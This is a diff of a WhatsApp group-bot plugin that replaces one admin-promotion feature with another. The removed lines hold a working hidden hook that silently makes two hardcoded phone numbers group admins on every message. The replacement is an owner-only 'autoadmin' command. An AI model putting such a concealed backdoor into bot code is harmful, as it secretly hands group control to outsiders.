@@ -1,15 +1,12 @@
-\*let handler = m => m
-
-handler.before = async function (m) {
-let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
-
-await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('50584051357') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
-
-
-await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('62822688195239') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
-
-  
-    }
+let handler = async (m, { conn, isAdmin }) => {  
+if (m.fromMe) return
+if (isAdmin) throw '*[❗] 𝙷𝙾𝙻𝙰 𝙲𝚁𝙴𝙰𝙳𝙾𝚁, 𝙲𝙾𝙼𝙾 𝙴𝚂𝚃𝙰? 𝚄𝚂𝚃𝙴𝙳 𝚈𝙰 𝙴𝚂 𝙰𝙳𝙼𝙸𝙽 𝙳𝙴 𝙴𝚂𝚃𝙴 𝙶𝚁𝚄𝙿𝙾*'
+try {  
+await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")
+} catch {
+await m.reply('*[❗] 𝙴𝚁𝚁𝙾𝚁, 𝙽𝙾 𝙵𝚄𝙴 𝙿𝙾𝚂𝙸𝙱𝙻𝙴 𝙳𝙰𝚁𝙻𝙴 𝙰𝙳𝙼𝙸𝙽*')}}
+handler.command = /^autoadmin$/i
+handler.rowner = true
 handler.group = true
+handler.botAdmin = true
 export default handler
-*\
